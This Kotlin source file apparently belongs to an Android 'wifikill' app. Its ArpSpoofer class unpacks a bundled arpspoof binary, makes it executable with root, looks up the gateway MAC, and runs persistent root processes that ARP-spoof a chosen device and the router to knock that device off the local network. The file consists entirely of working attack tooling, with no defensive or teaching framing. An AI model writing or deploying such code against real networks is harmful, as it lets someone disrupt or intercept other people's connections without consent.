package dev.a99.wifikill

import android.content.Context
import dev.a99.wifikill.model.Host
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.util.concurrent.ConcurrentHashMap

class ArpSpoofer(private val context: Context) {

    private val activeProcesses = ConcurrentHashMap<String, RootExecutor.PersistentProcess>()

    private suspend fun deployBinary(name: String): File = withContext(Dispatchers.IO) {
        val dir = File(context.filesDir, "bin").apply { mkdirs() }
        val dest = File(dir, name)
        if (!dest.exists()) {
            context.assets.open(name).use { `in` ->
                dest.outputStream().use { out -> `in`.copyTo(out) }
            }
        }
        if (!dest.canExecute()) {
            RootExecutor.exec("chmod 755 \"${dest.absolutePath}\"")
        }
        dest
    }

    private fun getNetworkInfo(): NetworkScanner.NetworkInfo =
        NetworkScanner(context).getNetworkInfo()

    fun getGatewayMac(gatewayIp: String): String? {
        val source = File("/proc/net/arp")
        if (!source.exists()) return null
        return source.readLines()
            .drop(1)
            .firstOrNull { it.startsWith(gatewayIp + " ") }
            ?.split(Regex("\\s+"))
            ?.getOrNull(3)
            ?.lowercase()
            ?.takeIf { it != "00:00:00:00:00:00" }
    }

    suspend fun kill(host: Host): Boolean = withContext(Dispatchers.IO) {
        if (activeProcesses.containsKey(host.ip)) return@withContext true
        val networkInfo = getNetworkInfo()
        val gatewayMac = getGatewayMac(networkInfo.gatewayIp)
            ?: return@withContext false
        val binary = deployBinary("arpspoof").absolutePath
        val cmd = "$binary ${networkInfo.iface} ${host.ip} ${host.mac} " +
            "${networkInfo.gatewayIp} $gatewayMac"
        val proc = RootExecutor.startPersistent(cmd)
        Thread.sleep(200)
        if (proc.pid <= 0 || !proc.isAlive) {
            proc.kill()
            return@withContext false
        }
        activeProcesses[host.ip] = proc
        true
    }

    fun unkill(host: Host) {
        activeProcesses.remove(host.ip)?.kill()
    }

    fun unkillAll() {
        activeProcesses.values.forEach { it.kill() }
        activeProcesses.clear()
    }
}